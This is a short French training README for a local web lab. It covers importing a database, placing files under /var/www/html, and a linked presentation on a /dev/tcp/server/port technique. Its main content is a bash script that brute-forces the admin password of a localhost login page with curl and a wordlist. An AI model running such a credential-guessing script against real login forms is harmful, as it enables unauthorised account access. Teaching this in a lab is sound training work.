# Péparation de l'environnement

## La base de données

Avec phpmyadmin, importer le fichier ```dbBotWeb.sql```.

## Les fichiers

Dans le dossier ```/var/www/html```, créer le dossier ```/Formation/Botweb/``` et y mettre dedans les fichiers nécessaires.


La présentation représente une méthode avec **```/dev/tcp/server/port```**
https://docs.google.com/presentation/d/1R-FvHCe-u803vxt09TQpg7vWNeEbOuZ3__2aY1DXk5M/pub?start=false&loop=false&delayms=3000#slide=id.g1fbdc71d17_2_155

# Méthod avec **```curl```**

```curl``` est une puissante commande qui permet de poster ou de consulter des données vers ou à partir d'un serveur web. https://en.wikipedia.org/wiki/CURL

## Programme bash
```bash
#!/bin/bash

user="admin"
#Main
while read pass
do
  echo "Testing $pass"
  response=$(curl -s -X POST 'http://localhost/Formation/BotWeb/login.php' \
              --data-urlencode "login=${user}" --data-urlencode "mp=${pass}")
  if [[ $response =~ ^.*Bienvenue[[:space:]]admin.*$ ]]
  then
    echo "Bingo: Mot de passe trouvé ($pass)"
    exit
  fi
done < $1
```
